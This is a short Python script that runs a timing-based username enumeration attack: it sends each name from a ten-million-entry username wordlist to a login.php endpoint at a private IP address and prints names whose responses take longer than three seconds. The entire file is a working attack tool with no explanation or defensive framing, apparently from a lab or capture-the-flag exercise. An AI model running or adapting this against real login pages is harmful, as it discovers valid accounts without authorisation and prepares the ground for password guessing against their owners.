import requests

def make_req(user):
        data = {
                "username" : user,
                "password" : "test"
        }
        
        r = requests.post("http://172.15.27.21:8080/login.php", data=data)
        time = r.elapsed.total_seconds()
        if time > 3:
                print("Username: {} | Response time: {}".format(user,time))

with open("./xato-net-10-million-usernames.txt") as f:
        for line in f:
                line = line.strip()
                make_req(line)